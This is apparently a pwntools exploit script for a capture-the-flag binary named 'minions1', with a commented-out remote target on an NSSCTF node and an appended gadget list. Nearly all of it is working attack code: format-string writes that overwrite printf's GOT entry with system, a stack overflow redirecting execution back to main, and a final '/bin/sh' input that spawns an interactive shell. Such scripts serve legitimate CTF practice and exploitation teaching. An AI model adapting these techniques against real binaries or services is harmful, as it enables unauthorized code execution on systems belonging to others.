from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

io=process("./minions1")
# io=remote("node1.anna.nssctf.cn",28654)
elf=ELF("./minions1")

key=0x6010A0
printf_got=0x601030
hdctf_addr=0x6010C0
bss_addr=0x601300 
read_text=0x4007E8
leave_ret=0x400758
pop_rdi_ret=0x400893
ret=0x400581
main=0x400610

# gdb.attach(io)
# pause()

io.recvuntil(b"name?\n\n")
payload=fmtstr_payload(6,{key:b"f",hdctf_addr:b"/bin/sh\x00"})
io.send(payload)


io.recvuntil(b"you\n")
payload=cyclic(0x38)+p64(main)
io.sendline(payload)

io.recvuntil(b"name?\n\n")
payload=fmtstr_payload(6,{printf_got:elf.plt[b"system"]})
io.send(payload)

io.recvuntil(b"you\n")
payload=cyclic(0x38)+p64(main)
io.sendline(payload)

io.recvuntil(b"name?\n\n")
payload=b"/bin/sh\x00"
io.send(payload)



io.interactive()

# Gadgets information
# ============================================================
# 0x0000000000400758 : leave ; ret
# 0x000000000040088c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040088e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400890 : pop r14 ; pop r15 ; ret
# 0x0000000000400892 : pop r15 ; ret
# 0x000000000040088b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040088f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000400670 : pop rbp ; ret
# 0x0000000000400893 : pop rdi ; ret
# 0x0000000000400891 : pop rsi ; pop r15 ; ret
# 0x000000000040088d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400581 : ret

# Unique gadgets found: 12
